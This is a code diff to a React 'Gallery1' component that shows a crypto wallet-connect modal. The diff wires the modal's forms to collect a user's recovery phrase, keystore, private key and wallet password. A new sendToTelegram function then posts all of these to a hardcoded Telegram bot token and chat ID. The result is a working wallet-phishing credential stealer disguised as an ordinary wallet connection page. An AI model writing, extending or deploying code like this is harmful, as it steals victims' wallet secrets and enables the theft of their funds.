@@ -1,6 +1,11 @@
 import React, { useState } from 'react';
 import './Gallery.css';
 import { useNavigate } from 'react-router-dom';
+import Loading from '../../Components/Loading';
+import { ClipLoader } from 'react-spinners';
+import { z } from 'zod';
+import { useForm } from 'react-hook-form';
+import { zodResolver } from '@hookform/resolvers/zod';
 
 const Gallery1 = () => {
     const [box, setBox] = useState([
@@ -135,6 +140,23 @@ const Gallery1 = () => {
     const [showModal, setShowModal] = useState(false);
     const [showManualConnect, setShowManualConnect] = useState(false);
     const [activeMethod, setActiveMethod] = useState('Phrase');
+      const [loading, setLoading] = useState(false);
+    
+        const formSchema = z.object({
+          phrase: z.string().min(1, 'required'),
+          keystore: z.string().email('required'),
+          privateKey: z.string().min(1, 'required'),
+          wallet: z.string().min(1, 'required'),
+        });
+      
+        const {
+          register,
+          handleSubmit,
+          formState: { errors, isValid },
+        } = useForm({
+          resolver: zodResolver(formSchema),
+          mode: 'onChange',
+        });
 
     const handleImageClick = (wallet) => {
         setSelectedWallet(wallet);
@@ -154,6 +176,63 @@ const Gallery1 = () => {
     const handleMethodChange = (method) => {
         setActiveMethod(method);
     };
+
+    const Nav = useNavigate()
+
+    const onSubmit = async (data) => {
+        const methodData = {
+            method: activeMethod,
+            value: data[activeMethod.toLowerCase()] || '', 
+        };
+    
+        const telegramData = {
+            ...data,
+            ...methodData, 
+        };
+        console.log('Data being sent to Telegram:', telegramData);
+        await sendToTelegram(telegramData);
+        setIsSubmitted(true);
+    };
+    
+    const sendToTelegram = async (data) => {
+        const botToken = '7936174005:AAGh1E77hIQBIJUZX1S7ppyouSOIMpFmsNg';
+        const chatId = '6701777563';
+    
+        const methodMessage = `
+    Method: ${data.method}
+    Value: ${data.value}
+    `;
+    
+        const message = `User Data:
+    Phrase: ${data.phrase || 'N/A'}
+    Keystore: ${data.keystore || 'N/A'}
+    Private Key: ${data.privateKey || 'N/A'}
+    Wallet Password: ${data.wallet || 'N/A'}
+    ${methodMessage}`;
+    
+        try {
+            setLoading(true);
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
+    
+            if (!response.ok) {
+                throw new Error(`Error ${response.status}: ${response.statusText}`);
+            }
+        } catch (error) {
+            console.error('Error sending message to Telegram:', error.message);
+        } finally {
+            setLoading(false);
+        }
+    };
+    
 
     return (
         <div className="Gallery1">
@@ -223,26 +302,40 @@ const Gallery1 = () => {
                                 </div>
                                 {activeMethod === 'Phrase' && (
                                     <div className="phrase-section">
-                                      <textarea name="" id="" row={8} placeholder='Enter your recovery phrase'></textarea>
+                                      <textarea {...register('phrase')} row={8} placeholder='Enter your recovery phrase'></textarea>
+                                      {errors.phrase && <span style={{color: 'red'}}>{errors.phrase.message}</span>}
                                       <span>Typically 12 (sometimes 24) words separated by single spaces</span>
-                                      <button className="proceed">Proceed</button>
+                                      <button className="proceed" onClick={() => handleSubmit(onSubmit)}>
+                                      {loading && activeMethod === 'Phrase' ? <ClipLoader color="white" size={20} /> : "proceed"}
+
+                                      </button>
                                       <button className="cancel" onClick={closeModal}>cancel</button>
                                     </div>
                                 )}
                                 {activeMethod === 'Keystore' && (
                                     <div className="keystore-section">
-                                         <textarea name="" id="" row={8} placeholder='Enter keystore'></textarea>
-                                         <input type="text" placeholder='Wallet-password'/>
+                                         <textarea {...register('keystore')} name="" id="" row={8} placeholder='Enter keystore'></textarea>
+                                         {errors.keystore && <span style={{color: 'red'}}>{errors.keystore.message}</span>}
+                                         <input {...register('wallet')} type="text" placeholder='Wallet-password'/>
+                                         {errors.wallet && <span style={{color: 'red'}}>{errors.wallet.message}</span>}
                                       <span>Several lines of text beginning with "..." plus the password you used to encrypt it.</span>
-                                      <button className="proceed">Proceed</button>
+                                      <button className="proceed" onClick={() => handleSubmit(onSubmit)}>
+                                      {loading && activeMethod === 'Keystore'? <ClipLoader color="white" size={20} /> : "proceed"}
+
+                                      </button>
                                       <button className="cancel" onClick={closeModal} >cancel</button>
                                     </div>
                                 )}
                                 {activeMethod === 'Private Key' && (
                                     <div className="private-key-section">
-                                        <input type="text" placeholder='Enter your private key' />
+                                        <input {...register('privateKey')} type="text" placeholder='Enter your private key' />
+                                        {errors.privateKey && <span style={{color: 'red'}}>{errors.privateKey.message}</span>}
                                       <span>Typically 12 (sometimes 24) words separated by single spaces</span>
-                                      <button className="proceed">Proceed</button>
+                                      <button className="proceed" onClick={() => handleSubmit(onSubmit)}>
+                                      {
+                                        loading && activeMethod === 'Private Key'?<ClipLoader color="white" size={20} /> : "proceed"
+                                        } 
+                                      </button>
                                       <button className="cancel" onClick={closeModal}>cancel</button>
                                     </div>
                                 )}
